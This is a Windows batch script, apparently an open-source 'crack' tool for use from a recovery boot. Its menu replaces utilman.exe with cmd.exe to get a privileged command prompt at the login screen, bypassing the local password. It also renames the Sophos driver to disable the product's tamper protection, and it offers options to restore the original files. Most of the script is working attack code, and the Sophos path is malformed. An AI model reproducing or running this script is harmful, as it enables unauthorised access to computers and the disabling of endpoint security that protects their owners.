@echo off
setlocal enabledelayedexpansion

rem Crack Script Made by S1rDyn0
rem Contributors: Viren070

if /i "%CD:~0,2%" NEQ "X:" (
  color 0C
  cls
  echo                __
  echo               / _^)
  echo      _.----._/ /
  echo     /         /
  echo  __/ ^(  ^| ^(  ^|
  echo /__.-'^|_^|--^|_^|
  echo EXPLOIT ERROR... & echo:
  echo You must be in the Installer/Recovery environment to run this script!
  pause
  cls
  exit /b 1
) else (
  cls
  color 3F
  echo: & echo Proceed with caution, we do not take any responsibility for damage caused by this script.
  echo Credit to S1rDyno for the orginal script ^& Viren070 for contributing to improve it.
  echo: & echo https://github.com/S1rDyn0/BootUSB-Crack-Script ^| OpenSource & echo: & echo: & echo:
  pause
)

:menu
color
cls
echo ^|==================================^|
echo ^|  WINDOWS 10  EXPLOIT BY S1rDyn0  ^|
echo ^|   ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~    ^| 
echo ^|                                  ^|
echo ^|  BUILD ^| Production      23.5.7  ^|
echo ^|==================================^| & echo: & echo:
echo ^[1^] Local Password Exploit
echo ^[2^] Disable Sophos Tamper Protection
echo ^[3^] Password ^& Sophos Exploit
echo ^[4^] Show On-Screen Keyboard
echo ^[5^] Restore Password Exploit
echo ^[6^] Recover Files from Backup
echo ^[0^] Exit
echo: & echo: & echo:

set validOptions= 0 1 2 3 4 5 6
set /p crackType=^> 

set optionFound=false
for %%a in (%validOptions%) do (
  if %crackType%==%%a (
    set optionFound=true
  )
)

if not %optionFound%==true (
  echo Looks like that's an invalid option!
  ping 0.0.0.0 -n 5 > nul
  goto menu
)

color 0A

if %crackType% EQU 0 (
  color
  cls & echo Exiting...
  exit /b 1
)

if %crackType% EQU 1 (
  cls
  echo Starting Hack
  if /i exist "c:\windows\system32" (
    echo System Directory Found

    echo Renaming utilman.exe to utilman.old
    ren C:\windows\system32\utilman.exe utilman.old || goto cmdFail

    echo Copying cmd.exe to utilman.exe
    copy C:\windows\system32\cmd.exe C:\windows\system32\utilman.exe || goto cmdFail

    echo -----------------------------------
    echo Exploit Completed ^| No errors
    pause

  ) else (
    color 0C
    echo Could not find System Directory... & echo:
    echo Failing Exploit and returning to menu
    pause
    goto menu
  )
)

if %crackType% EQU 2 (
  cls
  echo Starting Hack
  if /i exist "c:\windows\system32\drivers" (
    echo System Directory Found
    
    echo Renaming SophosED.sys to SophosED.sys.old
    ren C:\windows\system32\driversSophosED.sys SophosED.sys.old || goto cmdFail

    echo -----------------------------------
    echo Exploit Completed ^| No errors
    pause

  ) else (
    color 0C
    echo Could not find System Directory... & echo:
    echo Failing Exploit and returning to menu
    pause
    goto menu
  )
)

if %crackType% EQU 3 (
  cls
  echo Starting Hack
  if /i exist "c:\windows\system32" (
    echo System Directory Found

    echo Renaming utilman.exe to utilman.old
    ren C:\windows\system32\utilman.exe utilman.old || goto cmdFail

    echo Copying cmd.exe to utilman.exe
    copy C:\windows\system32\cmd.exe C:\windows\system32\utilman.exe || goto cmdFail

    if /i exist "c:\windows\system32\drivers" (
      echo System Directory Found
      
      echo Renaming SophosED.sys to SophosED.sys.old
      ren C:\windows\system32\driversSophosED.sys SophosED.sys.old || goto cmdFail

      echo -----------------------------------
      echo Exploit Completed ^| No errors
      pause

    ) else (
      color 0C
      echo Could not find System Directory... & echo:
      echo Failing Exploit and returning to menu
      pause
      goto menu
    )

  ) else (
    color 0C
    echo Could not find System Directory... & echo:
    echo Failing Exploit and returning to menu
    pause
    goto menu
  )
)

if %crackType% EQU 4 (
  start "C:/windows/system32/osk.exe"
)

if %crackType% EQU 5 (
  cls
  echo Preparing restore...
  if /i exist "x:\sources\restore" ( echo Located restore folder ) else ( echo Could not find Restore Folder... & echo: & echo Failing Exploit and returning to menu & color 0C & pause & goto menu )
  if /i exist "x:\sources\restore\cmd.exe" ( echo Command Prompt backup found ) else ( echo Could not find Command Prompt backup... & color 0C & echo: & echo Failing Exploit and returning to menu & pause & goto menu )
  if /i exist "x:\sources\restore\utilman.exe" ( echo Utilman backup found ) else ( echo Could not find Utilman backup... & color 0C & echo: & echo Failing Exploit and returning to menu & pause & goto menu )

  echo Restore files found! & echo: & echo Checking System files...
  if /i exist "c:\windows\system32" ( echo Located System folder ) else ( echo Could not find System Folder... & color 0C & echo: & echo Failing Exploit and returning to menu & pause & goto menu )
  if /i exist "c:\windows\system32\utilman.old" ( echo Original utilman.exe file found ) else ( echo Could not find utilman.old... & color 0C & echo: & echo Failing Exploit and returning to menu & pause & goto menu )
  if /i exist "c:\windows\system32\cmd.exe" ( echo Original cmd.exe file found ) else ( echo Could not find cmd.exe... & color 0C & echo: & echo Failing Exploit and returning to menu & pause & goto menu )
  if /i exist "c:\windows\system32\utilman.exe" ( echo Exploit utilman.exe file found ) else ( echo Could not find exploited utilman... & color 0C & echo: & echo Failing Exploit and returning to menu & pause & goto menu )

  echo All system files located! & echo: & echo Starting restore...
  echo Deleting exploited utilman.exe
  del C:\windows\system32\utilman.exe
  echo Renaming utilman.old to utilman.exe
  ren C:\windows\system32\utilman.old utilman.exe

  echo -----------------------------------
  echo Restore Completed ^| No errors
  pause
)

rem FOR OPTION 6, RESTORE FILES FROM THE RESTORE FOLDER AND THEN FINALY UPDATE THE SYSTEM DRIVE WITH NORMAL FILES
if %crackType% EQU 6 (
  cls
  echo Preparing restore...
  if /i exist "x:\sources\restore" ( echo Located restore folder ) else ( echo Could not find Restore Folder... & color 0C & echo: & echo Failing Exploit and returning to menu & pause & goto menu )
  if /i exist "x:\sources\restore\cmd.exe" ( echo Command Prompt backup found ) else ( echo Could not find Command Prompt backup... & color 0C & echo: & echo Failing Exploit and returning to menu & pause & goto menu )
  if /i exist "x:\sources\restore\utilman.exe" ( echo Utilman backup found ) else ( echo Could not find Utilman backup... & color 0C & echo: & echo Failing Exploit and returning to menu & pause & goto menu )
  
  echo Backup files located! & echo: & echo Starting restore...
  echo Deleting exploited utilman.exe
  del C:\windows\system32\utilman.exe || goto cmdFail
  echo Restoring utilman.exe...
  copy X:\sources\restore\utilman.exe C:\windows\system32\utilman.exe || goto cmdFail
  echo Deleting cmd.exe...
  del C:\windows\system32\cmd.exe || goto cmdFail
  echo Restoring cmd.exe...
  copy X:\sources\restore\cmd.exe C:\windows\system32\cmd.exe || goto cmdFail
  
  echo -----------------------------------
  echo Restore Completed ^| No errors
  pause
)
  
  

goto menu
:cmdFail
color 0C 
echo:
echo Failing Exploit and returning to menu
pause
goto menu
